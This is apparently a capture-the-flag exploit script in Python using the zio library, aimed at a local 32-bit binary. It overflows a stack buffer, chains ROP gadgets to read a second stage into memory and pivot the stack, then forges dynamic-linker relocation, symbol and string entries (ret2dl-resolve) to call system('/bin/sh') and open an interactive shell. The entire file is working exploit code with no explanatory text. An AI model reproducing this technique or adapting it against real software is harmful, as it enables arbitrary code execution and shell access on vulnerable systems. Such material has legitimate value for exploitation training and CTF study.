from zio import *
target  = './c14595742a95ebf0944804d8853b834c'
io      = zio(target, print_read = COLORED(RAW, 'blue'), print_write = COLORED(RAW, 'green'), timeout = 10000)
io.gdb_hint([0x804839b])

io.read_line()

plt_read    = 0x08048390
plt_resolve = 0x0804839b

leave_ret   = 0x08048481
pop_ebp_ret = 0x08048453
ppp_ret     = 0x0804856c

adr_stage   = 0x0804a000 + 0x800

payload0  = 'A' * 0x70
payload0 += l32(plt_read)
payload0 += l32(ppp_ret)
payload0 += l32(0)
payload0 += l32(adr_stage)
payload0 += l32(0x500)

payload0 += l32(pop_ebp_ret)
payload0 += l32(adr_stage)
payload0 += l32(leave_ret)
payload0 += l32(plt_resolve)

io.writeline(payload0)

adr_rel_plt         = 0x8048318
adr_dyn_sym         = 0x80481d8
adr_dyn_str         = 0x8048268
adr_fake_rel_plt    = adr_stage + 0x100
adr_fake_dyn_sym    = adr_stage + 0x208
adr_fake_dyn_str    = adr_stage + 0x300
adr_shell           = adr_stage + 0x400

got_read        = 0x804a004

# .rel.plt  0x8048318:   0x0804a000  0x00000107  0x0804a004  0x00000207

payload1  = 'A' * 0x4
payload1 += l32(plt_resolve)
payload1 += l32(adr_fake_rel_plt - adr_rel_plt)
payload1 += l32(0xdeadbeef)
payload1 += l32(adr_shell)
payload1  = payload1.ljust(0x100, 'A')
payload1 += l32(got_read)
payload1 += l32((adr_fake_dyn_sym - adr_dyn_sym)/0x10*0x100 + 0x7)
payload1  = payload1.ljust(0x208, 'A')
payload1 += l32(adr_fake_dyn_str - adr_dyn_str)
payload1 += l32(0x0)
payload1 += l32(0x0)
payload1 += l32(0x12)
payload1  = payload1.ljust(0x300, 'A')
payload1 += 'system\x00'
payload1  = payload1.ljust(0x400, 'A')
payload1 += '/bin/sh\x00'

io.writeline(payload1)

io.interact()
